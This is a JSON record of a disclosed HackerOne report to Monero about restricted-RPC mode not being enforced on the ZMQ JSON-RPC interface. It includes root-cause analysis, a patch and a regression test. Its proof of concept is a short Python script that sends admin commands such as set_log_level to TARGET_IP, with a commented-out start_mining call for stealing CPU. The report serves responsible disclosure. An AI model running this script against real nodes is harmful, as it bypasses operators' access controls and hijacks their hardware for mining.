@@ -1,0 +1,121 @@
+{
+  "id": 3601469,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjAxNDY5",
+  "url": "https://hackerone.com/reports/3601469",
+  "title": "Restricted RPC Policy Bypass on ZMQ JSON-RPC Allows Unauthenticated Remote Admin Actions",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-12T20:45:26.621Z",
+  "submitted_at": "2026-03-12T20:45:26.814Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "usagirabbit",
+    "url": "/usagirabbit",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ot1hqjlt05uk7t54yqrm88e22yx8/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-08-17T09:16:00.113Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-08-17T09:15:59.936Z",
+  "team_member_agreed_on_going_public_at": "2026-07-21T23:48:04.197Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nI found a high-severity access-control issue in Monero's ZMQ JSON-RPC surface.\n\nWhen `monerod` is started in restricted/public-node mode, the HTTP RPC layer correctly suppresses admin-only methods, but the ZMQ JSON-RPC layer does not inherit or enforce that restriction. If an operator binds ZMQ beyond loopback, an unauthenticated remote client can invoke state-changing methods that the operator reasonably expects `--restricted-rpc` / `--public-node` to block.\n\nThe vulnerable flow is:\n\n1. [README.md](README.md#L769) says public remote nodes must run with `--restricted-rpc`.\n2. [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L106) describes `--public-node` as \"restricted RPC mode, view-only commands\".\n3. [src/rpc/core_rpc_server.h](src/rpc/core_rpc_server.h#L117) hides HTTP admin methods behind `!m_restricted`.\n4. [src/daemon/daemon.cpp](src/daemon/daemon.cpp#L105) creates the ZMQ handler without propagating restricted-mode state in the vulnerable version.\n5. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L941) dispatches the exposed ZMQ methods unconditionally in the vulnerable version.\n\nThis exposes the following restricted HTTP methods over ZMQ:\n\n1. `start_mining`\n2. `stop_mining`\n3. `save_bc`\n4. `set_log_level`\n5. `mining_status`\n6. `get_peer_list`\n\nThe highest-impact path is `start_mining`, because [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L483) accepts an attacker-controlled payout address and attacker-controlled thread count up to `hardware_concurrency() * 4`.\n\n It is an RPC access-control bypass.\n\n## Severity\n\nApproximate CVSS v3.1: `8.1` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`.\n\nI consider this `High`.\n\nWhy `8.1` is defensible:\n\n1. The attacker is remote and unauthenticated.\n2. The attack requires only a normal ZMQ JSON-RPC request once the operator has exposed ZMQ beyond loopback.\n3. The affected methods cross a documented restricted/view-only boundary.\n4. `start_mining` can redirect CPU resources to an attacker-controlled address and materially degrade node availability.\n\nThe default ZMQ bind is loopback-only at [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L112), so exploitation requires a non-loopback ZMQ bind. That does not remove the vulnerability because the product-level issue is that restricted/public-node policy does not carry across RPC surfaces, and ZMQ also lacks the HTTP-side external-bind confirmation gate shown at [src/rpc/rpc_args.cpp](src/rpc/rpc_args.cpp#L99).\n\n## Affected Versions\n\n`git log --follow` shows the ZMQ JSON-RPC handler path originates with commit `77986023c` (`json serialization for rpc-relevant monero types`).\n\n`git tag --contains 77986023c` shows the issue is present in released tags beginning with `v0.12.0.0`.\n\nConservatively, I believe the affected release range is:\n\n1. `v0.12.0.0` and later releases containing ZMQ JSON-RPC\n2. all `v0.13.x`\n3. all `v0.14.x`\n4. all `v0.15.x`\n5. all `v0.16.x`\n6. all `v0.17.x`\n7. all `v0.18.x`\n8. current `master`\n\nOperational note: exploitability requires that the operator expose ZMQ RPC beyond loopback, for example with `--zmq-rpc-bind-ip 0.0.0.0` or a publicly reachable IPv6 bind.\n\n## AI Usage Disclosure\n\nThis report was prepared with AI assistance for drafting, editing, and organizing the findings.\n\nAll substantive technical claims retained here were checked against the local source tree, local repository history, and local build/test results before inclusion.\n\nI did not test against public Monero infrastructure or third-party nodes.\n\n## Root Cause\n\nMonero has an explicit restricted-RPC policy on the HTTP surface:\n\n1. [README.md](README.md#L769) says `--restricted-rpc` is mandatory for public remote nodes.\n2. [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L106) describes `--public-node` as restricted/view-only.\n3. [src/rpc/core_rpc_server.h](src/rpc/core_rpc_server.h#L117) and nearby lines gate HTTP admin methods behind `!m_restricted`.\n\nExamples from the HTTP route map:\n\n```cpp\nMAP_URI_AUTO_JON2_IF(\"/start_mining\", on_start_mining, COMMAND_RPC_START_MINING, !m_restricted)\nMAP_URI_AUTO_JON2_IF(\"/stop_mining\", on_stop_mining, COMMAND_RPC_STOP_MINING, !m_restricted)\nMAP_URI_AUTO_JON2_IF(\"/mining_status\", on_mining_status, COMMAND_RPC_MINING_STATUS, !m_restricted)\nMAP_URI_AUTO_JON2_IF(\"/save_bc\", on_save_bc, COMMAND_RPC_SAVE_BC, !m_restricted)\nMAP_URI_AUTO_JON2_IF(\"/get_peer_list\", on_get_peer_list, COMMAND_RPC_GET_PEER_LIST, !m_restricted)\nMAP_URI_AUTO_JON2_IF(\"/set_log_level\", on_set_log_level, COMMAND_RPC_SET_LOG_LEVEL, !m_restricted)\n```\n\nBy contrast, the vulnerable ZMQ path did not carry restricted mode into the handler:\n\n```cpp\nstruct zmq_internals\n{\n  explicit zmq_internals(t_core& core, t_p2p& p2p)\n    : rpc_handler{core.get(), p2p.get()}\n    , server{rpc_handler}\n  {}\n};\n```\n\nAnd [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L80) exposed the sensitive methods unconditionally:\n\n```cpp\nconstexpr const handler_map handlers[] =\n{\n  {u8\"get_peer_list\", handle_message<GetPeerList>},\n  {u8\"mining_status\", handle_message<MiningStatus>},\n  {u8\"save_bc\", handle_message<SaveBC>},\n  {u8\"set_log_level\", handle_message<SetLogLevel>},\n  {u8\"start_mining\", handle_message<StartMining>},\n  {u8\"stop_mining\", handle_message<StopMining>}\n};\n```\n\nFinally, the vulnerable dispatcher executed the handler as long as the method name existed:\n\n```cpp\nconst std::string request_type = req_full.getRequestType();\nconst auto matched_handler = std::lower_bound(std::begin(handlers), std::end(handlers), request_type);\nif (matched_handler == std::end(handlers) || matched_handler->method_name != request_type)\n  return BAD_REQUEST(request_type, req_full.getID());\n\nreturn matched_handler->call(*this, req_full.getID(), req_full.getMessage());\n```\n\nThere was no restricted-mode denial between request parsing and handler dispatch.\n\n## Affected Code\n\nRelevant locations:\n\n1. [README.md](README.md#L769)\n2. [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L106)\n3. [src/rpc/rpc_args.cpp](src/rpc/rpc_args.cpp#L99)\n4. [src/rpc/core_rpc_server.h](src/rpc/core_rpc_server.h#L117)\n5. [src/daemon/daemon.cpp](src/daemon/daemon.cpp#L61)\n6. [src/daemon/daemon.cpp](src/daemon/daemon.cpp#L105)\n7. [src/rpc/daemon_handler.h](src/rpc/daemon_handler.h#L50)\n8. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L80)\n9. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L483)\n10. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L611)\n11. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L728)\n12. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L941)\n\n## Validation\n\nI validated this finding locally by:\n\n1. confirming that the vulnerable ZMQ path had no restricted-state propagation or method gate\n2. confirming that HTTP restricted mode deliberately suppresses the same methods\n3. implementing a patch that propagates restricted mode into the ZMQ handler and blocks the restricted method subset\n4. compiling the patched daemon target\n5. compiling the unit test target\n6. running a regression test for the restricted-method set\n\nCommands used for validation:\n\n```bash\nmake -C build-audit daemon -j4\nmake -C build-audit unit_tests -j4\n./build-audit/tests/unit_tests/unit_tests --gtest_filter=ZmqDaemonHandler.RestrictedMethodParity\n```\n\nObserved regression-test result:\n\n```text\nNote: Google Test filter = ZmqDaemonHandler.RestrictedMethodParity\n[==========] Running 1 test from 1 test suite.\n[----------] 1 test from ZmqDaemonHandler\n[ RUN      ] ZmqDaemonHandler.RestrictedMethodParity\n[       OK ] ZmqDaemonHandler.RestrictedMethodParity (0 ms)\n[  PASSED  ] 1 test.\n```\n\nI did not test against public Monero infrastructure or third-party nodes.\n\n## Proof of Concept\n\nThe following PoC targets a vulnerable build. It demonstrates the access-control bypass over ZMQ on a node the operator believes is running in restricted/view-only mode.\n\n### 1. Start a vulnerable daemon with restricted HTTP RPC but externally bound ZMQ RPC\n\n```bash\n./monerod \\\n  --non-interactive \\\n  --offline \\\n  --data-dir /tmp/monero-zmq-vuln \\\n  --restricted-rpc \\\n  --rpc-bind-ip 0.0.0.0 \\\n  --confirm-external-bind \\\n  --zmq-rpc-bind-ip 0.0.0.0 \\\n  --zmq-rpc-bind-port 18082\n```\n\nNotes:\n\n1. `--restricted-rpc` and the public-node guidance imply view-only remote access.\n2. ZMQ external bind does not require the HTTP-side `--confirm-external-bind` safeguard.\n3. The daemon can remain otherwise local/offline; the bypass is about RPC authorization, not blockchain sync.\n\n### 2. From another host, send a restricted method over ZMQ JSON-RPC\n\nInstall a ZMQ client library if needed:\n\n```bash\npython3 -m pip install pyzmq\n```\n\nPoC script:\n\n```python\n#!/usr/bin/env python3\nimport json\nimport zmq\n\nRPC_VERSION = 2 << 16  # 131072\n\nctx = zmq.Context.instance()\nsock = ctx.socket(zmq.REQ)\nsock.connect(\"tcp://TARGET_IP:18082\")\n\ndef call(method, params):\n    request = {\n        \"jsonrpc\": \"2.0\",\n        \"id\": 1,\n        \"method\": method,\n        \"params\": {\n            \"rpc_version\": RPC_VERSION,\n            **params,\n        },\n    }\n    sock.send_json(request)\n    response = sock.recv_json()\n    print(f\"method={method}\")\n    print(json.dumps(response, indent=2, sort_keys=True))\n    print()\n\n# Fully reproducible auth-bypass demonstration with no extra daemon state needed.\ncall(\"set_log_level\", {\"level\": 4})\n\n# Same surface, higher impact path. Any valid address for the daemon nettype works.\n# Uncomment on a vulnerable mainnet/default daemon to demonstrate CPU/resource theft.\n# call(\"start_mining\", {\n#     \"miner_address\": \"<valid_monero_address>\",\n#     \"threads_count\": 8,\n#     \"do_background_mining\": False,\n#     \"ignore_battery\": True,\n# })\n```\n\n### 3. Expected result on a vulnerable build\n\nFor `set_log_level`, the vulnerable daemon returns success even though the node is in restricted mode:\n\n```json\n{\n  \"id\": 1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": {\n    \"rpc_version\": 131072,\n    \"status\": \"OK\"\n  }\n}\n```\n\nThat response is enough to demonstrate the authorization failure. The same request path can then invoke `start_mining`, `stop_mining`, `save_bc`, `mining_status`, and `get_peer_list`.\n\n### 4. Expected result on the patched build\n\nThe patched build denies the same request:\n\n```json\n{\n  \"error\": {\n    \"code\": 1,\n    \"error_str\": \"Failed\",\n    \"message\": \"\\\"set_log_level\\\" is not available in restricted mode.\"\n  },\n  \"id\": 1,\n  \"jsonrpc\": \"2.0\"\n}\n```\n\n## Proposed Patch\n\nThe patch below works cross-platform because it only changes in-process flag propagation and RPC-method gating. It does not depend on platform-specific networking APIs.\n\n```diff\ndiff --git a/src/daemon/daemon.cpp b/src/daemon/daemon.cpp\nindex 9b6d63d3d..c67c69108 100644\n--- a/src/daemon/daemon.cpp\n+++ b/src/daemon/daemon.cpp\n@@ -60,8 +60,8 @@ namespace daemonize {\n \n struct zmq_internals\n {\n-  explicit zmq_internals(t_core& core, t_p2p& p2p)\n-    : rpc_handler{core.get(), p2p.get()}\n+  explicit zmq_internals(t_core& core, t_p2p& p2p, bool restricted)\n+    : rpc_handler{core.get(), p2p.get(), restricted}\n     , server{rpc_handler}\n   {}\n \n@@ -104,7 +104,7 @@ public:\n \n     if (!command_line::get_arg(vm, daemon_args::arg_zmq_rpc_disabled))\n     {\n-      zmq.reset(new zmq_internals{core, p2p});\n+      zmq.reset(new zmq_internals{core, p2p, restricted});\n \n       const std::string zmq_port = command_line::get_arg(vm, daemon_args::arg_zmq_rpc_bind_port);\n       const std::string zmq_address = command_line::get_arg(vm, daemon_args::arg_zmq_rpc_bind_ip);\ndiff --git a/src/rpc/daemon_handler.cpp b/src/rpc/daemon_handler.cpp\nindex 6df71340a..849a9499e 100644\n--- a/src/rpc/daemon_handler.cpp\n+++ b/src/rpc/daemon_handler.cpp\n@@ -107,14 +107,33 @@ namespace rpc\n       {u8\"start_mining\", handle_message<StartMining>},\n       {u8\"stop_mining\", handle_message<StopMining>}\n     };\n+\n+    constexpr const char* restricted_methods[] =\n+    {\n+      \"get_peer_list\",\n+      \"mining_status\",\n+      \"save_bc\",\n+      \"set_log_level\",\n+      \"start_mining\",\n+      \"stop_mining\"\n+    };\n   } // anonymous\n \n-  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p)\n-    : m_core(c), m_p2p(p2p)\n+  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted)\n+    : m_core(c), m_p2p(p2p), m_restricted(restricted)\n   {\n     const auto last_sorted = std::is_sorted_until(std::begin(handlers), std::end(handlers));\n     if (last_sorted != std::end(handlers))\n       throw std::logic_error{std::string{\"ZMQ JSON-RPC handlers map is not properly sorted, see \"} + last_sorted->method_name};\n+\n+    const auto last_restricted = std::is_sorted_until(std::begin(restricted_methods), std::end(restricted_methods));\n+    if (last_restricted != std::end(restricted_methods))\n+      throw std::logic_error{std::string{\"ZMQ restricted-method map is not properly sorted, see \"} + *last_restricted};\n+  }\n+\n+  bool DaemonHandler::is_restricted_method(const std::string& method) noexcept\n+  {\n+    return std::binary_search(std::begin(restricted_methods), std::end(restricted_methods), method);\n   }\n \n   void DaemonHandler::handle(const GetHeight::Request& req, GetHeight::Response& res)\n@@ -928,6 +947,14 @@ namespace rpc\n       FullMessage req_full(std::move(request), true);\n \n       const std::string request_type = req_full.getRequestType();\n+      if (m_restricted && is_restricted_method(request_type))\n+      {\n+        Message fail;\n+        fail.status = Message::STATUS_FAILED;\n+        fail.error_details = std::string{\"\\\"\"} + request_type + \"\\\" is not available in restricted mode.\";\n+        return FullMessage::getResponse(fail, req_full.getID());\n+      }\n+\n       const auto matched_handler = std::lower_bound(std::begin(handlers), std::end(handlers), request_type);\n       if (matched_handler == std::end(handlers) || matched_handler->method_name != request_type)\n         return BAD_REQUEST(request_type, req_full.getID());\ndiff --git a/src/rpc/daemon_handler.h b/src/rpc/daemon_handler.h\nindex 1da5419d2..be0dd9ce8 100644\n--- a/src/rpc/daemon_handler.h\n+++ b/src/rpc/daemon_handler.h\n@@ -51,10 +51,12 @@ class DaemonHandler : public RpcHandler\n {\n   public:\n \n-    DaemonHandler(cryptonote::core& c, t_p2p& p2p);\n+    DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted = false);\n \n     ~DaemonHandler() { }\n \n+    static bool is_restricted_method(const std::string& method) noexcept;\n+\n     void handle(const GetHeight::Request& req, GetHeight::Response& res);\n \n     void handle(const GetBlocksFast::Request& req, GetBlocksFast::Response& res);\n@@ -143,6 +145,7 @@ class DaemonHandler : public RpcHandler\n \n     cryptonote::core& m_core;\n     t_p2p& m_p2p;\n+    bool m_restricted;\n };\n \n }  // namespace rpc\ndiff --git a/tests/unit_tests/zmq_rpc.cpp b/tests/unit_tests/zmq_rpc.cpp\nindex 240251d1b..2c6a6102a 100644\n--- a/tests/unit_tests/zmq_rpc.cpp\n+++ b/tests/unit_tests/zmq_rpc.cpp\n@@ -37,6 +37,7 @@\n #include \"cryptonote_basic/cryptonote_format_utils.h\"\n #include \"json_serialization.h\"\n #include \"net/zmq.h\"\n+#include \"rpc/daemon_handler.h\"\n #include \"rpc/message.h\"\n #include \"rpc/zmq_pub.h\"\n #include \"rpc/zmq_server.h\"\n@@ -69,6 +70,18 @@ TEST(ZmqFullMessage, Request)\n   EXPECT_STREQ(\"foo\", parsed.getRequestType().c_str());\n }\n \n+TEST(ZmqDaemonHandler, RestrictedMethodParity)\n+{\n+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"get_peer_list\"));\n+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"mining_status\"));\n+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"save_bc\"));\n+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"set_log_level\"));\n+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"start_mining\"));\n+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"stop_mining\"));\n+  EXPECT_FALSE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"get_height\"));\n+  EXPECT_FALSE(cryptonote::rpc::DaemonHandler::is_restricted_method(\"send_raw_tx\"));\n+}\n+\n namespace\n {\n   using published_json = std::pair<std::string, rapidjson::Document>;\n```\n\n## Hardening Notes\n\nThe patch above closes the high-severity admin-method bypass. Two follow-up hardening ideas remain:\n\n1. add a ZMQ equivalent of HTTP's `--confirm-external-bind` safeguard\n2. consider whether ZMQ read-only methods such as `get_info` and `get_transaction_pool` should also mirror HTTP restricted-mode redaction semantics\n\nThose follow-ups are lower-severity design-parity issues. The attached patch addresses the reportable `8.1` access-control bypass.\n\n## Bounty Payment\n\n\nIf accepted, please use this monero payout address:\n\n`46Xi9JyEnEjYDuBWYrWNo8MLKyQ1BiL1VbFMJoZkrL2w8ZABc7ALQoyRspCgnkQKbwgPuM6wJEqoCF7U1Cpxo5981Uhr8TN`\n\n## Impact\n\nAn unauthenticated remote client can bypass Monero's documented restricted/view-only RPC boundary over ZMQ and perform actions that should be unavailable on a public restricted node.\n\nPractical impact includes:\n\n1. `start_mining`: start CPU mining to an attacker-controlled address with attacker-controlled thread count, causing resource theft and service degradation\n2. `stop_mining`: stop legitimate mining\n3. `save_bc`: force immediate blockchain save / extra disk I/O\n4. `set_log_level`: change runtime logging behavior\n5. `get_peer_list`: expose information restricted HTTP intentionally hides\n6. `mining_status`: reveal operational mining state that restricted HTTP intentionally hides\n\nIt is an access-control failure on a remotely reachable daemon-management interface.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-08-20T23:48:04.948Z",
+  "allow_singular_disclosure_after": 310401.445361672,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "n0v4x"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
